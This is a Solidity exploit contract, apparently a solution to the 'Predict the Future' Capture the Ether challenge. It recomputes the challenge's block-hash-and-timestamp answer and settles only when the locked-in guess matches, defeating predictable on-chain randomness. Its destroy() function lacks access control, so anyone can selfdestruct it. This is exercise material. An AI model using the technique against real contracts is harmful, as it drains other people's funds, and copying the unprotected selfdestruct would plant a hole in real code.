pragma solidity ^0.4.21;
import './PredictTheFutureChallenge.sol';

contract Solution{
  address addrChallenge = 0x461E04d40723178373c858fA163e789383D5280D;
  PredictTheFutureChallenge cte = PredictTheFutureChallenge(addrChallenge);
  
  function () public payable{}

  function lockInGuess(uint8 myGuess) public payable{
    require(msg.value == 1 ether);
    cte.lockInGuess.value(msg.value)(myGuess);
  }

  function settle(uint8 myGuess) public{
    uint8 test = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
    require(test == myGuess);
    //require(myGuess == (uint8(keccak256(block.blockhash(block.number - 1), now))%10));
    
    cte.settle();
  }

  function destroy() public{
    selfdestruct(msg.sender);
  }
}